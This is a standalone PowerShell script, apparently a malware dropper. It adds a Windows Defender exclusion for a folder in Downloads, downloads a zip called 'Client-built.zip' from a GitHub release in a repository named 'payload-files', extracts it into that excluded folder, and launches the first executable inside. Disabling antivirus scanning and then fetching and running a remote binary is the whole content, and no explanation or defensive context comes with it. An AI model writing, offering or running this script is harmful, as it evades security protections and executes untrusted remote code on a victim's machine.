Add-MpPreference -ExclusionPath "$HOME\Downloads\ClientExtracted"
$url = "https://github.com/NightAlive0/payload-files/releases/download/v1.0.1/Client-built.zip"
$out = "$HOME\Downloads\Client-built.zip"
$dest = "$HOME\Downloads\ClientExtracted"
Invoke-WebRequest -Uri $url -OutFile $out
Expand-Archive -Path $out -DestinationPath $dest -Force
$exe = Get-ChildItem -Path $dest -Filter "*.exe" -Recurse | Select-Object -First 1
if ($exe) { Start-Process $exe.FullName } else { Write-Host "No executable found!" }
